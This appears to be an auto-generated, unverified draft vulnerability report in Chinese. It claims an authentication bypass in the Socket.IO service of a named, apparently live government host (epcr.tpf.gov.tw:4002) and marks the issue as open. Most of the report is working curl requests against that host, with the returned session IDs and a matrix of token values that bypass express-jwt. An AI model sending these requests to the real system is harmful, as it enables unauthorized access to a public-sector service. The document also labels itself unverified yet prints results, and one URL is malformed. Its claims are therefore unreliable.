# POC/EXP — EPCR 4002 Socket.IO 鉴权绕过:任意 token 值可绕过 express-jwt 获取 SID

> 漏洞ID: `d0f8ec00-117f-4c66-9f9c-65f8e1b64cf7`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4002/socket.io/?EIO=4&transport=polling`

**類型**: Authentication Bypass

## 描述

epcr.tpf.gov.tw:4002 的 Socket.IO 服务根 namespace (`/`) 鉴权中间件存在严重配置错误。express-jwt 仅在 `Authorization: Bearer <JWT格式>` 形式下触发严格校验并返回 `jwt malformed` 错误，但通过 cookie (`token=<任意值>`) 或 query (`?token=<任意值>`) 携带任何值（包括空字符串、`anonymous`、`admin`、`test`、完整 JWT）均能绕过鉴权返回合法 SID。攻击者可建立未授权 Socket.IO 连接至 SocketIoService.js 的根 namespace，进而参与 PCDT 实时事件流（虽然业务事件会被服务端销毁会话，但连接建立本身已构成严重漏洞）。

## 前置條件

无。无需凭证，仅需网络可达 epcr.tpf.gov.tw:4002 即可发起攻击

## POC / 復現步驟

```
**目标**: https://epcr.tpf.gov.tw:4002/socket.io/?EIO=4&transport=polling (根 namespace)

**触发 express-jwt 的请求**:
```
curl -H "Authorization: Bearer anonymous" "https://epcr.tpf.gov.tw:4002/socket.io/?EIO=4&transport=polling"
→ <h1>jwt malformed</h1>  (express-jwt 错误，证明鉴权层存在)
```

**绕过鉴权拿 SID**:
```
curl -H "Cookie: token=anonymous" "https://epcr.tpf.gov.tw:4002/socket.io/?EIO=4&transport=polling"
→ {"sid":"1G4n16jqnrJtOxXTAAQD","upgrades":["websocket"],"pingInterval":25000,"pingTimeout":5000}

curl "https://epcr.tpf.gov.tw:4002/socket.io/?EIO=4&transport=polling?token=anonymous"
→ 同样返回合法 SID

curl -H "Cookie: jwt=<valid JWT>" "https://epcr.tpf.gov.tw:4002/socket.io/?EIO=4&transport=polling"
→ 同样返回合法 SID
```

**全 token 形式测试矩阵**:
| Token 形式 | 响应 |
|------------|------|
| `Bearer anonymous` | HTML `jwt malformed` |
| `Bearer <valid JWT>` | HTML `jwt malformed` |
| `Cookie token=anonymous` | JSON SID ✓ |
| `Cookie token=<JWT>` | JSON SID ✓ |
| `Cookie token=` (空) | JSON SID ✓ |
| `Cookie auth=anonymous` | JSON SID ✓ |
| `Cookie jwt=<JWT>` | JSON SID ✓ |
| `?token=anonymous` | JSON SID ✓ |

**SID 拿到后**: WS 升级支持，业务事件会被服务端销毁会话（400 Bad Request `Session ID unknown` 或 SSL EOF），但未授权连接已建立
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
